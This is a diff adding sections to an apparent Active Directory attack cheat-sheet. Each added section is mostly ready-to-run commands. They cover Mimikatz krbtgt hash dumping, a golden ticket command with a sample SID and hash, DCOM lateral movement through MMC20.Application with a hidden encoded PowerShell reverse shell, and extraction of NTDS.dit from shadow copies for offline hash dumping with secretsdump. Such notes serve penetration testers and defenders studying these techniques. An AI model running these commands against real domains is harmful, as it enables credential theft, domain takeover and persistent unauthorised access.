@@ -753,9 +753,17 @@ Reference: https://www.hackingarticles.in/a-detailed-guide-on-rubeus/
 
 `lsadump::lsa /inject /name:krbtgt`
 
+Or if localy loggeon to DC
+
+`lsadump::lsa /patch`
+
 2. Create golden Ticket
 
-`Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:`
+```powershell
+
+kerberos::golden /user:admin /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884111 /krbtgt:e460605a9dbd55097c6cf77af2f89a03 /ptt
+
+```
 
 ## Sekeleton key
 
@@ -785,7 +793,23 @@ Access anything without knowing the user
 
 ## Distributed Component Object Model
 
+The MMC Application Class allows the creation of Application Objects, which expose the ExecuteShellCommand method under the `Document.ActiveView` property. This method allows execution of any shell command as long as the authenticated user is authorized to do so.
 
+```powershell
+
+#from elevated shell
+
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.xx.xx"))
+
+# pass the command
+
+$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
+
+# or pass base64 encoded reverse shell
+
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e  base_64_code","7")
+
+```
 
 ## Dumping Credentials
 
@@ -882,7 +906,31 @@ Rogue DHCPv6
 
 Constrained delegation, if delegation must be used, is a much safer alternative as it restricts delegation to specific services. 
 
+## Cracking Shdow copies 
 
+```powershell
+
+# 1. create a shadow copy of volume C:
+
+vshadow.exe -nw -p  C:
+
+# 2. copy shadow copies device name
+
+Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
+
+# 3. copy ntds.dit from the Shadow to local disk 
+
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
+
+# 4. get system from current 
+
+reg.exe save hklm\system c:\system.bak
+
+# 5. use impackets secrets dump
+
+impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
+
+```
 
 ## Additional Reading
 * Good Theory around AD: [zer1t0](https://zer1t0.gitlab.io/posts/attacking_ad/)
